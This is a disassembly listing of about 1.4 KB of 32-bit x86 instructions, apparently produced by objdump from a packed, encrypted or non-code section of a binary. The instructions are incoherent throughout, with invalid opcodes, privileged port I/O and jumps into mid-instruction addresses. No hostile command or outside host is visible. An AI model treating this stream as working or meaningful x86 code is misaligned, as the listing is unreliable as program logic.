  40b05e:	3b 92 1f 11 42 5c    	cmp    0x5c42111f(%edx),%edx
  40b064:	02 3e                	add    (%esi),%bh
  40b066:	83 25 93 78 e2 14 c0 	andl   $0xffffffc0,0x14e27893
  40b06d:	1c 42                	sbb    $0x42,%al
  40b06f:	89 1a                	mov    %ebx,(%edx)
  40b071:	dc bf 5c c5 a5 28    	fdivrl 0x28a5c55c(%edi)
  40b077:	37                   	aaa
  40b078:	e1 69                	loope  0x40b0e3
  40b07a:	26 38 eb             	es cmp %ch,%bl
  40b07d:	f6 df                	neg    %bh
  40b07f:	53                   	push   %ebx
  40b080:	d0 4f 4b             	rorb   $1,0x4b(%edi)
  40b083:	c9                   	leave
  40b084:	d7                   	xlat   %ds:(%ebx)
  40b085:	7e f0                	jle    0x40b077
  40b087:	4c                   	dec    %esp
  40b088:	aa                   	stos   %al,%es:(%edi)
  40b089:	11 0b                	adc    %ecx,(%ebx)
  40b08b:	ee                   	out    %al,(%dx)
  40b08c:	10 05 9d ce e9 91    	adc    %al,0x91e9ce9d
  40b092:	b1 30                	mov    $0x30,%cl
  40b094:	47                   	inc    %edi
  40b095:	66 98                	cbtw
  40b097:	38 bb d8 2c 95 a8    	cmp    %bh,-0x576ad328(%ebx)
  40b09d:	39 78 88             	cmp    %edi,-0x78(%eax)
  40b0a0:	6a 21                	push   $0x21
  40b0a2:	5b                   	pop    %ebx
  40b0a3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0a4:	f4                   	hlt
  40b0a5:	b5 58                	mov    $0x58,%ch
  40b0a7:	5e                   	pop    %esi
  40b0a8:	c3                   	ret
  40b0a9:	72 7b                	jb     0x40b126
  40b0ab:	2e 7e 26             	jle,pn 0x40b0d4
  40b0ae:	2c c7                	sub    $0xc7,%al
  40b0b0:	0a 82 84 57 a2 cd    	or     -0x325da87c(%edx),%al
  40b0b6:	ca 61 01             	lret   $0x161
  40b0b9:	9f                   	lahf
  40b0ba:	69 c2 53 45 95 0c    	imul   $0xc954553,%edx,%eax
  40b0c0:	9a 3b 85 03 b0 be d9 	lcall  $0xd9be,$0xb003853b
  40b0c7:	4a                   	dec    %edx
  40b0c8:	50                   	push   %eax
  40b0c9:	e3 ea                	jecxz  0x40b0b5
  40b0cb:	3f                   	aas
  40b0cc:	4c                   	dec    %esp
  40b0cd:	6b bd 71 6a 6e de a3 	imul   $0xffffffa3,-0x2191958f(%ebp),%edi
  40b0d4:	37                   	aaa
  40b0d5:	7a 21                	jp     0x40b0f8
  40b0d7:	a3 2e 6e 36 3b       	mov    %eax,0x3b366e2e
  40b0dc:	60                   	pusha
  40b0dd:	16                   	push   %ss
  40b0de:	5f                   	pop    %edi
  40b0df:	4a                   	dec    %edx
  40b0e0:	ad                   	lods   %ds:(%esi),%eax
  40b0e1:	0f 34                	sysenter
  40b0e3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0e4:	03 dc                	add    %esp,%ebx
  40b0e6:	1e                   	push   %ds
  40b0e7:	24 78                	and    $0x78,%al
  40b0e9:	4c                   	dec    %esp
  40b0ea:	77 7a                	ja     0x40b166
  40b0ec:	94                   	xchg   %eax,%esp
  40b0ed:	8d                   	lea    (bad),%ecx
  40b0ee:	ca cf 9e             	lret   $0x9ecf
  40b0f1:	d7                   	xlat   %ds:(%ebx)
  40b0f2:	44                   	inc    %esp
  40b0f3:	3e 8f c1             	ds pop %ecx
  40b0f6:	6b de 77             	imul   $0x77,%esi,%ebx
  40b0f9:	d1 77 6c             	shll   $1,0x6c(%edi)
  40b0fc:	dd bb aa 60 77 7a    	fnstsw 0x7a7760aa(%ebx)
  40b102:	56                   	push   %esi
  40b103:	8b 1e                	mov    (%esi),%ebx
  40b105:	d4 65                	aam    $0x65
  40b107:	c8 22 57 28          	enter  $0x5722,$0x28
  40b10b:	14 ae                	adc    $0xae,%al
  40b10d:	e3 c1                	jecxz  0x40b0d0
  40b10f:	0d bd 44 8d 6b       	or     $0x6b8d44bd,%eax
  40b114:	e0 e2                	loopne 0x40b0f8
  40b116:	7f 42                	jg     0x40b15a
  40b118:	a8 38                	test   $0x38,%al
  40b11a:	fa                   	cli
  40b11b:	c5 12                	lds    (%edx),%edx
  40b11d:	53                   	push   %ebx
  40b11e:	09 b1 bb b6 db 5f    	or     %esi,0x5fdbb6bb(%ecx)
  40b124:	cc                   	int3
  40b125:	50                   	push   %eax
  40b126:	9b                   	fwait
  40b127:	19 89 f9 66 0a 0c    	sbb    %ecx,0xc0a66f9(%ecx)
  40b12d:	74 b8                	je     0x40b0e7
  40b12f:	ca bb 53             	lret   $0x53bb
  40b132:	63 2e                	arpl   %ebp,(%esi)
  40b134:	b5 bd                	mov    $0xbd,%ch
  40b136:	d6                   	salc
  40b137:	e9 0e 0c ff b0       	jmp    0xb13fbd4a
  40b13c:	ca 69 1d             	lret   $0x1d69
  40b13f:	e8 6d 5b c4 1d       	call   0x1e050cb1
  40b144:	41                   	inc    %ecx
  40b145:	ad                   	lods   %ds:(%esi),%eax
  40b146:	2b 39                	sub    (%ecx),%edi
  40b148:	6f                   	outsl  %ds:(%esi),(%dx)
  40b149:	ce                   	into
  40b14a:	a2 af f3 be f6       	mov    %al,0xf6bef3af
  40b14f:	aa                   	stos   %al,%es:(%edi)
  40b150:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b151:	82 ac ab 1d 42 bc 9f 	subb   $0x15,-0x6043bde3(%ebx,%ebp,4)
  40b158:	15 
  40b159:	ba a4 01 ca a0       	mov    $0xa0ca01a4,%edx
  40b15e:	e6 b8                	out    %al,$0xb8
  40b160:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b161:	4e                   	dec    %esi
  40b162:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b163:	74 3e                	je     0x40b1a3
  40b165:	97                   	xchg   %eax,%edi
  40b166:	13 8c 78 e7 9b 0c ed 	adc    -0x12f36419(%eax,%edi,2),%ecx
  40b16d:	90                   	nop
  40b16e:	59                   	pop    %ecx
  40b16f:	a9 45 aa bf db       	test   $0xdbbfaa45,%eax
  40b174:	9a 3b 25 3a c4 61 bb 	lcall  $0xbb61,$0xc43a253b
  40b17b:	98                   	cwtl
  40b17c:	0e                   	push   %cs
  40b17d:	1f                   	pop    %ds
  40b17e:	21 59 6c             	and    %ebx,0x6c(%ecx)
  40b181:	e4 89                	in     $0x89,%al
  40b183:	11 c1                	adc    %eax,%ecx
  40b185:	b1 06                	mov    $0x6,%cl
  40b187:	a8 2f                	test   $0x2f,%al
  40b189:	07                   	pop    %es
  40b18a:	e7 5b                	out    %eax,$0x5b
  40b18c:	06                   	push   %es
  40b18d:	95                   	xchg   %eax,%ebp
  40b18e:	ce                   	into
  40b18f:	76 c3                	jbe    0x40b154
  40b191:	03 07                	add    (%edi),%eax
  40b193:	01 38                	add    %edi,(%eax)
  40b195:	db 92 a8 c3 4f a9    	fistl  -0x56b03c58(%edx)
  40b19b:	98                   	cwtl
  40b19c:	16                   	push   %ss
  40b19d:	20 c0                	and    %al,%al
  40b19f:	31 7c 08 36          	xor    %edi,0x36(%eax,%ecx,1)
  40b1a3:	02 38                	add    (%eax),%bh
  40b1a5:	8e 2f                	mov    (%edi),%gs
  40b1a7:	bf 82 00 1d 5d       	mov    $0x5d1d0082,%edi
  40b1ac:	d8 94 43 8a 99 55 e4 	fcoms  -0x1baa6676(%ebx,%eax,2)
  40b1b3:	54                   	push   %esp
  40b1b4:	6b 23 bd             	imul   $0xffffffbd,(%ebx),%esp
  40b1b7:	1c 15                	sbb    $0x15,%al
  40b1b9:	6c                   	insb   (%dx),%es:(%edi)
  40b1ba:	5d                   	pop    %ebp
  40b1bb:	f6 fd                	idiv   %ch
  40b1bd:	5e                   	pop    %esi
  40b1be:	d4 89                	aam    $0x89
  40b1c0:	48                   	dec    %eax
  40b1c1:	98                   	cwtl
  40b1c2:	df e7                	(bad)
  40b1c4:	16                   	push   %ss
  40b1c5:	18 17                	sbb    %dl,(%edi)
  40b1c7:	f9                   	stc
  40b1c8:	e5 9d                	in     $0x9d,%eax
  40b1ca:	66 03 68 4b          	add    0x4b(%eax),%bp
  40b1ce:	77 ee                	ja     0x40b1be
  40b1d0:	10 91 a0 3d 60 51    	adc    %dl,0x51603da0(%ecx)
  40b1d6:	19 7c 79 42          	sbb    %edi,0x42(%ecx,%edi,2)
  40b1da:	6c                   	insb   (%dx),%es:(%edi)
  40b1db:	ad                   	lods   %ds:(%esi),%eax
  40b1dc:	3d fa 4d 45 22       	cmp    $0x22454dfa,%eax
  40b1e1:	64 4c                	fs dec %esp
  40b1e3:	fc                   	cld
  40b1e4:	25 4a f4 d7 6a       	and    $0x6ad7f44a,%eax
  40b1e9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b1ea:	76 d9                	jbe    0x40b1c5
  40b1ec:	9f                   	lahf
  40b1ed:	b0 48                	mov    $0x48,%al
  40b1ef:	0d 5a bd 24 2a       	or     $0x2a24bd5a,%eax
  40b1f4:	fb                   	sti
  40b1f5:	72 9b                	jb     0x40b192
  40b1f7:	9e                   	sahf
  40b1f8:	f4                   	hlt
  40b1f9:	0c b6                	or     $0xb6,%al
  40b1fb:	38 8c 55 ef 7f 34 4d 	cmp    %cl,0x4d347fef(%ebp,%edx,2)
  40b202:	aa                   	stos   %al,%es:(%edi)
  40b203:	99                   	cltd
  40b204:	58                   	pop    %eax
  40b205:	93                   	xchg   %eax,%ebx
  40b206:	f3 d9 b0 21 ed 95 01 	repz fnstenv 0x195ed21(%eax)
  40b20d:	34 b5                	xor    $0xb5,%al
  40b20f:	de 61 3d             	fisubs 0x3d(%ecx)
  40b212:	13 3d 85 6d c4 20    	adc    0x20c46d85,%edi
  40b218:	53                   	push   %ebx
  40b219:	f8                   	clc
  40b21a:	50                   	push   %eax
  40b21b:	61                   	popa
  40b21c:	f2 d6                	repnz salc
  40b21e:	ab                   	stos   %eax,%es:(%edi)
  40b21f:	d3 63 47             	shll   %cl,0x47(%ebx)
  40b222:	6a cb                	push   $0xffffffcb
  40b224:	0c 0e                	or     $0xe,%al
  40b226:	d6                   	salc
  40b227:	12 05 d8 02 39 ce    	adc    0xce3902d8,%al
  40b22d:	0b 87 f5 cc cc 03    	or     0x3ccccf5(%edi),%eax
  40b233:	2e 16                	cs push %ss
  40b235:	26 b4 4f             	es mov $0x4f,%ah
  40b238:	05 5f 00 e2 7f       	add    $0x7fe2005f,%eax
  40b23d:	3c f2                	cmp    $0xf2,%al
  40b23f:	ea 4e 75 50 e4 21 21 	ljmp   $0x2121,$0xe450754e
  40b246:	6a 49                	push   $0x49
  40b248:	8b a6 ad 86 00 7b    	mov    0x7b0086ad(%esi),%esp
  40b24e:	b5 11                	mov    $0x11,%ch
  40b250:	34 99                	xor    $0x99,%al
  40b252:	73 fd                	jae    0x40b251
  40b254:	d6                   	salc
  40b255:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b256:	cc                   	int3
  40b257:	cc                   	int3
  40b258:	be c1 a1 ae 18       	mov    $0x18aea1c1,%esi
  40b25d:	64 0f 89 c8 b7 4b 0d 	fs jns 0xd8c6a2c
  40b264:	9a 6f 3c 8f 8c e7 da 	lcall  $0xdae7,$0x8c8f3c6f
  40b26b:	ca b4 c4             	lret   $0xc4b4
  40b26e:	83 55 5b 66          	adcl   $0x66,0x5b(%ebp)
  40b272:	5d                   	pop    %ebp
  40b273:	07                   	pop    %es
  40b274:	3c f9                	cmp    $0xf9,%al
  40b276:	15 cb 42 6e ac       	adc    $0xac6e42cb,%eax
  40b27b:	c8 7b b9 95          	enter  $0xb97b,$0x95
  40b27f:	fd                   	std
  40b280:	ba 73 3c 6f ec       	mov    $0xec6f3c73,%edx
  40b285:	0a a5 e2 d4 f8 22    	or     0x22f8d4e2(%ebp),%ah
  40b28b:	8e 28                	mov    (%eax),%gs
  40b28d:	89 9c 4e a9 a6 c2 6a 	mov    %ebx,0x6ac2a6a9(%esi,%ecx,2)
  40b294:	12 aa 43 7d 50 82    	adc    -0x7daf82bd(%edx),%ch
  40b29a:	8f                   	(bad)
  40b29b:	f4                   	hlt
  40b29c:	89 1e                	mov    %ebx,(%esi)
  40b29e:	e3 f3                	jecxz  0x40b293
  40b2a0:	cd 65                	int    $0x65
  40b2a2:	10 55 83             	adc    %dl,-0x7d(%ebp)
  40b2a5:	35 bd 26 85 0e       	xor    $0xe8526bd,%eax
  40b2aa:	ce                   	into
  40b2ab:	36 aa                	ss stos %al,%es:(%edi)
  40b2ad:	46                   	inc    %esi
  40b2ae:	e5 d3                	in     $0xd3,%eax
  40b2b0:	a1 a7 4d 39 6e       	mov    0x6e394da7,%eax
  40b2b5:	20 bb 21 7d ec 41    	and    %bh,0x41ec7d21(%ebx)
  40b2bb:	24 2e                	and    $0x2e,%al
  40b2bd:	d3 d7                	rcl    %cl,%edi
  40b2bf:	88 3f                	mov    %bh,(%edi)
  40b2c1:	f6 82 37 cf 22 b4 08 	testb  $0x8,-0x4bdd30c9(%edx)
  40b2c8:	80 0b 07             	orb    $0x7,(%ebx)
  40b2cb:	86 b6 e2 3c e4 c8    	xchg   %dh,-0x371bc31e(%esi)
  40b2d1:	91                   	xchg   %eax,%ecx
  40b2d2:	17                   	pop    %ss
  40b2d3:	96                   	xchg   %eax,%esi
  40b2d4:	57                   	push   %edi
  40b2d5:	4a                   	dec    %edx
  40b2d6:	74 d9                	je     0x40b2b1
  40b2d8:	ee                   	out    %al,(%dx)
  40b2d9:	fa                   	cli
  40b2da:	74 11                	je     0x40b2ed
  40b2dc:	d4 9f                	aam    $0x9f
  40b2de:	be 83 58 07 cf       	mov    $0xcf075883,%esi
  40b2e3:	c5 37                	lds    (%edi),%esi
  40b2e5:	e5 1d                	in     $0x1d,%eax
  40b2e7:	7e ab                	jle    0x40b294
  40b2e9:	35 02 1b 16 bd       	xor    $0xbd161b02,%eax
  40b2ee:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2ef:	51                   	push   %ecx
  40b2f0:	d6                   	salc
  40b2f1:	58                   	pop    %eax
  40b2f2:	5d                   	pop    %ebp
  40b2f3:	e6 e2                	out    %al,$0xe2
  40b2f5:	a8 7a                	test   $0x7a,%al
  40b2f7:	9a 95 57 d6 5f 41 e5 	lcall  $0xe541,$0x5fd65795
  40b2fe:	39 54 5b ae          	cmp    %edx,-0x52(%ebx,%ebx,2)
  40b302:	10 34 2b             	adc    %dh,(%ebx,%ebp,1)
  40b305:	28 34 89             	sub    %dh,(%ecx,%ecx,4)
  40b308:	60                   	pusha
  40b309:	74 c0                	je     0x40b2cb
  40b30b:	6c                   	insb   (%dx),%es:(%edi)
  40b30c:	92                   	xchg   %eax,%edx
  40b30d:	b0 25                	mov    $0x25,%al
  40b30f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b310:	f7 78 34             	idivl  0x34(%eax)
  40b313:	c8 cd 72 6e          	enter  $0x72cd,$0x6e
  40b317:	8e 65 eb             	mov    -0x15(%ebp),%fs
  40b31a:	ca ec 2a             	lret   $0x2aec
  40b31d:	a8 30                	test   $0x30,%al
  40b31f:	00 d0                	add    %dl,%al
  40b321:	22 8d 4e 5b 6b 35    	and    0x356b5b4e(%ebp),%cl
  40b327:	62 0e                	bound  %ecx,(%esi)
  40b329:	65 51                	gs push %ecx
  40b32b:	b6 df                	mov    $0xdf,%dh
  40b32d:	ba 62 2e 4e da       	mov    $0xda4e2e62,%edx
  40b332:	6c                   	insb   (%dx),%es:(%edi)
  40b333:	89 42 bf             	mov    %eax,-0x41(%edx)
  40b336:	30 f2                	xor    %dh,%dl
  40b338:	cf                   	iret
  40b339:	46                   	inc    %esi
  40b33a:	2c a0                	sub    $0xa0,%al
  40b33c:	47                   	inc    %edi
  40b33d:	7a 80                	jp     0x40b2bf
  40b33f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b340:	ef                   	out    %eax,(%dx)
  40b341:	2a 72 1f             	sub    0x1f(%edx),%dh
  40b344:	84 40 2c             	test   %al,0x2c(%eax)
  40b347:	26 08 a3 b7 a2 4c ef 	or     %ah,%es:-0x10b35d49(%ebx)
  40b34e:	20 27                	and    %ah,(%edi)
  40b350:	77 f1                	ja     0x40b343
  40b352:	49                   	dec    %ecx
  40b353:	e5 93                	in     $0x93,%eax
  40b355:	e4 29                	in     $0x29,%al
  40b357:	0e                   	push   %cs
  40b358:	d0 91 18 78 79 a1    	rclb   $1,-0x5e8687e8(%ecx)
  40b35e:	63 5f bb             	arpl   %ebx,-0x45(%edi)
  40b361:	70 e0                	jo     0x40b343
  40b363:	7b 8c                	jnp    0x40b2f1
  40b365:	35 c2 80 00 2a       	xor    $0x2a0080c2,%eax
  40b36a:	bc 7b 6b ad b9       	mov    $0xb9ad6b7b,%esp
  40b36f:	16                   	push   %ss
  40b370:	c6                   	(bad)
  40b371:	77 07                	ja     0x40b37a
  40b373:	ba b9 c5 0d 80       	mov    $0x800dc5b9,%edx
  40b378:	14 2a                	adc    $0x2a,%al
  40b37a:	77 e4                	ja     0x40b360
  40b37c:	3a 7e fe             	cmp    -0x2(%esi),%bh
  40b37f:	53                   	push   %ebx
  40b380:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40b381:	8f                   	(bad)
  40b382:	0b a3 4e e8 a7 66    	or     0x66a7e84e(%ebx),%esp
  40b388:	ba 6a b7 84 88       	mov    $0x8884b76a,%edx
  40b38d:	bc c3 23 be 50       	mov    $0x50be23c3,%esp
  40b392:	7a f6                	jp     0x40b38a
  40b394:	c7                   	(bad)
  40b395:	32 a9 94 d0 7a 14    	xor    0x147ad094(%ecx),%ch
  40b39b:	86 23                	xchg   %ah,(%ebx)
  40b39d:	04 39                	add    $0x39,%al
  40b39f:	e8 da 69 84 17       	call   0x17c51d7e
  40b3a4:	a8 36                	test   $0x36,%al
  40b3a6:	f5                   	cmc
  40b3a7:	64 b3 90             	fs mov $0x90,%bl
  40b3aa:	73 9d                	jae    0x40b349
  40b3ac:	84 91 24 10 22 c2    	test   %dl,-0x3dddefdc(%ecx)
  40b3b2:	be 8b f9 0d 3f       	mov    $0x3f0df98b,%esi
  40b3b7:	45                   	inc    %ebp
  40b3b8:	69 bb f6 0f 9f ec 10 	imul   $0x43aa0d10,-0x1360f00a(%ebx),%edi
  40b3bf:	0d aa 43 
  40b3c2:	84 93 bd 38 49 8e    	test   %dl,-0x71b6c743(%ebx)
  40b3c8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3c9:	d6                   	salc
  40b3ca:	b5 f6                	mov    $0xf6,%ch
  40b3cc:	e5 32                	in     $0x32,%eax
  40b3ce:	b6 bb                	mov    $0xbb,%dh
  40b3d0:	31 9b ad e9 ff 26    	xor    %ebx,0x26ffe9ad(%ebx)
  40b3d6:	36 84 c9             	ss test %cl,%cl
  40b3d9:	55                   	push   %ebp
  40b3da:	be 8b 88 b1 62       	mov    $0x62b1888b,%esi
  40b3df:	dc 44 1b 85          	faddl  -0x7b(%ebx,%ebx,1)
  40b3e3:	8a a4 3f a4 0e dd f4 	mov    -0xb22f15c(%edi,%edi,1),%ah
  40b3ea:	bc 18 f0 64 a5       	mov    $0xa564f018,%esp
  40b3ef:	18 93 22 38 b6 9a    	sbb    %dl,-0x6549c7de(%ebx)
  40b3f5:	3f                   	aas
  40b3f6:	db 05 9e db 06 97    	fildl  0x9706db9e
  40b3fc:	d0 e1                	shl    $1,%cl
  40b3fe:	e5 a1                	in     $0xa1,%eax
  40b400:	d7                   	xlat   %ds:(%ebx)
  40b401:	33 d8                	xor    %eax,%ebx
  40b403:	55                   	push   %ebp
  40b404:	3d d4 14 d1 0d       	cmp    $0xdd114d4,%eax
  40b409:	cc                   	int3
  40b40a:	c4 a7 f0 2b 00 59    	les    0x59002bf0(%edi),%esp
  40b410:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b411:	3a ef                	cmp    %bh,%ch
  40b413:	c5 c9 b7             	(bad)
  40b416:	8b bd 02 a3 1c b8    	mov    -0x47e35cfe(%ebp),%edi
  40b41c:	11 82 2e 2d c4 2f    	adc    %eax,0x2fc42d2e(%edx)
  40b422:	b1 a2                	mov    $0xa2,%cl
  40b424:	ff b2 e8 27 b2 a4    	push   -0x5b4dd818(%edx)
  40b42a:	99                   	cltd
  40b42b:	bd 1c 1c 4e 86       	mov    $0x864e1c1c,%ebp
  40b430:	64 58                	fs pop %eax
  40b432:	a9 94 04 7a fa       	test   $0xfa7a0494,%eax
  40b437:	11 10                	adc    %edx,(%eax)
  40b439:	ba 55 8b 8a bf       	mov    $0xbf8a8b55,%edx
  40b43e:	34 96                	xor    $0x96,%al
  40b440:	4a                   	dec    %edx
  40b441:	76 5f                	jbe    0x40b4a2
  40b443:	37                   	aaa
  40b444:	ab                   	stos   %eax,%es:(%edi)
  40b445:	88 a6 75 81 06 41    	mov    %ah,0x41068175(%esi)
  40b44b:	26 3e 2a 17          	es sub %ds:(%edi),%dl
  40b44f:	99                   	cltd
  40b450:	53                   	push   %ebx
  40b451:	b0 5b                	mov    $0x5b,%al
  40b453:	01 dc                	add    %ebx,%esp
  40b455:	de de                	(bad)
  40b457:	9b                   	fwait
  40b458:	fd                   	std
  40b459:	67 b4 47             	addr16 mov $0x47,%ah
  40b45c:	10 65 22             	adc    %ah,0x22(%ebp)
  40b45f:	f5                   	cmc
  40b460:	07                   	pop    %es
  40b461:	a3 1d 00 4d 6e       	mov    %eax,0x6e4d001d
  40b466:	4b                   	dec    %ebx
  40b467:	18 b7 30 f8 7d 11    	sbb    %dh,0x117df830(%edi)
  40b46d:	a2 13 d4 85 4f       	mov    %al,0x4f85d413
  40b472:	1f                   	pop    %ds
  40b473:	32 cf                	xor    %bh,%cl
  40b475:	35 35 e3 8a a9       	xor    $0xa98ae335,%eax
  40b47a:	d1 06                	roll   $1,(%esi)
  40b47c:	5b                   	pop    %ebx
  40b47d:	f5                   	cmc
  40b47e:	b3 25                	mov    $0x25,%bl
  40b480:	1a b0 04 6d 3c 0a    	sbb    0xa3c6d04(%eax),%dh
  40b486:	8d 1e                	lea    (%esi),%ebx
  40b488:	92                   	xchg   %eax,%edx
  40b489:	5b                   	pop    %ebx
  40b48a:	1a 6e b2             	sbb    -0x4e(%esi),%ch
  40b48d:	04 73                	add    $0x73,%al
  40b48f:	b6 9c                	mov    $0x9c,%dh
  40b491:	8c 98 da d8 67 26    	mov    %ds,0x2667d8da(%eax)
  40b497:	32 c0                	xor    %al,%al
  40b499:	e3 a9                	jecxz  0x40b444
  40b49b:	16                   	push   %ss
  40b49c:	99                   	cltd
  40b49d:	18 f4                	sbb    %dh,%ah
  40b49f:	86 63 5c             	xchg   %ah,0x5c(%ebx)
  40b4a2:	13 12                	adc    (%edx),%edx
  40b4a4:	e9 03 e1 23 2b       	jmp    0x2b6495ac
  40b4a9:	4b                   	dec    %ebx
  40b4aa:	c8 1d 52 ac          	enter  $0x521d,$0xac
  40b4ae:	01 d4                	add    %edx,%esp
  40b4b0:	a1 e0 62 8b 34       	mov    0x348b62e0,%eax
  40b4b5:	b9 33 18 4c 29       	mov    $0x294c1833,%ecx
  40b4ba:	45                   	inc    %ebp
  40b4bb:	8e ca                	mov    %edx,%cs
  40b4bd:	b3 8a                	mov    $0x8a,%bl
  40b4bf:	19 98 53 f0 45 96    	sbb    %ebx,-0x69ba0fad(%eax)
  40b4c5:	30 5d a9             	xor    %bl,-0x57(%ebp)
  40b4c8:	b5 cb                	mov    $0xcb,%ch
  40b4ca:	1d 18 71 0d 05       	sbb    $0x50d7118,%eax
  40b4cf:	4e                   	dec    %esi
  40b4d0:	98                   	cwtl
  40b4d1:	7a 7d                	jp     0x40b550
  40b4d3:	c9                   	leave
  40b4d4:	ba b1 ab a7 78       	mov    $0x78a7abb1,%edx
  40b4d9:	27                   	daa
  40b4da:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b4db:	79 76                	jns    0x40b553
  40b4dd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b4de:	ae                   	scas   %es:(%edi),%al
  40b4df:	16                   	push   %ss
  40b4e0:	c8 3e 1f b9          	enter  $0x1f3e,$0xb9
  40b4e4:	07                   	pop    %es
  40b4e5:	bd 49 7d 66 6f       	mov    $0x6f667d49,%ebp
  40b4ea:	5a                   	pop    %edx
  40b4eb:	05 ce 31 2a b1       	add    $0xb12a31ce,%eax
  40b4f0:	4a                   	dec    %edx
  40b4f1:	dc 92 b4 ce 70 4e    	fcoml  0x4e70ceb4(%edx)
  40b4f7:	d2 ae 0f 14 0a b0    	shrb   %cl,-0x4ff5ebf1(%esi)
  40b4fd:	0f 8d 5f 28 8f d4    	jge    0xd4cfdd62
  40b503:	af                   	scas   %es:(%edi),%eax
  40b504:	5b                   	pop    %ebx
  40b505:	ed                   	in     (%dx),%eax
  40b506:	b8 27 9e 8c 12       	mov    $0x128c9e27,%eax
  40b50b:	1b 12                	sbb    (%edx),%edx
  40b50d:	ed                   	in     (%dx),%eax
  40b50e:	cc                   	int3
  40b50f:	7c 82                	jl     0x40b493
  40b511:	aa                   	stos   %al,%es:(%edi)
  40b512:	71 f2                	jno    0x40b506
  40b514:	38 49 59             	cmp    %cl,0x59(%ecx)
  40b517:	d5 81                	aad    $0x81
  40b519:	e2 d3                	loop   0x40b4ee
  40b51b:	4e                   	dec    %esi
  40b51c:	68 a9 90 bf 29       	push   $0x29bf90a9
  40b521:	54                   	push   %esp
  40b522:	61                   	popa
  40b523:	d3 45 b8             	roll   %cl,-0x48(%ebp)
  40b526:	b9 74 f0 f1 ad       	mov    $0xadf1f074,%ecx
  40b52b:	dd 98 4a fa ac 51    	fstpl  0x51acfa4a(%eax)
  40b531:	ac                   	lods   %ds:(%esi),%al
  40b532:	43                   	inc    %ebx
  40b533:	04 73                	add    $0x73,%al
  40b535:	9c                   	pushf
  40b536:	72 75                	jb     0x40b5ad
  40b538:	0b 74 16 49          	or     0x49(%esi,%edx,1),%esi
  40b53c:	02 bd 08 89 ee ca    	add    -0x351176f8(%ebp),%bh
  40b542:	b9 19 0a b0 6f       	mov    $0x6fb00a19,%ecx
  40b547:	76 cd                	jbe    0x40b516
  40b549:	0d 66 14 7f 30       	or     $0x307f1466,%eax
  40b54e:	da c7                	fcmovb %st(7),%st
  40b550:	55                   	push   %ebp
  40b551:	2c a3                	sub    $0xa3,%al
  40b553:	6f                   	outsl  %ds:(%esi),(%dx)
  40b554:	78 0d                	js     0x40b563
  40b556:	09 5c 2e b8          	or     %ebx,-0x48(%esi,%ebp,1)
  40b55a:	25 26 9c 59 f3       	and    $0xf3599c26,%eax
  40b55f:	4a                   	dec    %edx
  40b560:	b6 f9                	mov    $0xf9,%dh
  40b562:	75 37                	jne    0x40b59b
  40b564:	61                   	popa
  40b565:	8c 2c 11             	mov    %gs,(%ecx,%edx,1)
  40b568:	91                   	xchg   %eax,%ecx
  40b569:	be 9b f3 0b c8       	mov    $0xc80bf39b,%esi
  40b56e:	b8 ea 5d 96 72       	mov    $0x72965dea,%eax
  40b573:	5f                   	pop    %edi
  40b574:	8e 1f                	mov    (%edi),%ds
  40b576:	83 3d 57 87 d2 9a e5 	cmpl   $0xffffffe5,0x9ad28757
  40b57d:	ee                   	out    %al,(%dx)
  40b57e:	eb 17                	jmp    0x40b597
  40b580:	74 d6                	je     0x40b558
  40b582:	10 a4 c7 0e 43 1b 20 	adc    %ah,0x201b430e(%edi,%eax,8)
  40b589:	e2 eb                	loop   0x40b576
  40b58b:	ea 29 1b 20 61 bc 9e 	ljmp   $0x9ebc,$0x61201b29
  40b592:	67 0b a4 84 ec       	or     -0x137c(%si),%esp
  40b597:	49                   	dec    %ecx
  40b598:	f3 4f                	repz dec %edi
  40b59a:	49                   	dec    %ecx
  40b59b:	ea 79 5c 77 03 00 7b 	ljmp   $0x7b00,$0x3775c79
  40b5a2:	9b                   	fwait
  40b5a3:	96                   	xchg   %eax,%esi
  40b5a4:	52                   	push   %edx
  40b5a5:	06                   	push   %es
  40b5a6:	f9                   	stc
  40b5a7:	49                   	dec    %ecx
  40b5a8:	f6 9a ff 8d fb 8c    	negb   -0x73047201(%edx)
  40b5ae:	0f 5a c6             	cvtps2pd %xmm6,%xmm0
  40b5b1:	c5 a7 c5 c7 33 26    	lds    0x2633c7c5(%edi),%esp
  40b5b7:	3f                   	aas
  40b5b8:	42                   	inc    %edx
  40b5b9:	dc 21                	fsubl  (%ecx)
  40b5bb:	23 31                	and    (%ecx),%esi
  40b5bd:	1c ff                	sbb    $0xff,%al
  40b5bf:	92                   	xchg   %eax,%edx
  40b5c0:	f4                   	hlt
  40b5c1:	66 ab                	stos   %ax,%es:(%edi)
  40b5c3:	52                   	push   %edx
  40b5c4:	38 5d f4             	cmp    %bl,-0xc(%ebp)
  40b5c7:	7c 5e                	jl     0x40b627
  40b5c9:	63 f2                	arpl   %esi,%edx
  40b5cb:	96                   	xchg   %eax,%esi
  40b5cc:	51                   	push   %ecx
  40b5cd:	fd                   	std
  40b5ce:	53                   	push   %ebx
  40b5cf:	58                   	pop    %eax
  40b5d0:	c7                   	(bad)
  40b5d1:	b7 66                	mov    $0x66,%bh
  40b5d3:	42                   	inc    %edx
  40b5d4:	fe                   	(bad)
  40b5d5:	dd 42 1f             	fldl   0x1f(%edx)
  40b5d8:	d4 fe                	aam    $0xfe
  40b5da:	73 6b                	jae    0x40b647
  40b5dc:	0e                   	push   %cs
  40b5dd:	7d 30                	jge    0x40b60f
  40b5df:	c9                   	leave
  40b5e0:	a9 8d f2 5f 28       	test   $0x285ff28d,%eax
  40b5e5:	71 d1                	jno    0x40b5b8
  40b5e7:	8c e6                	mov    %fs,%esi
  40b5e9:	35 44 3c 67 1a       	xor    $0x1a673c44,%eax
  40b5ee:	05 8b 23 2c 8d       	add    $0x8d2c238b,%eax
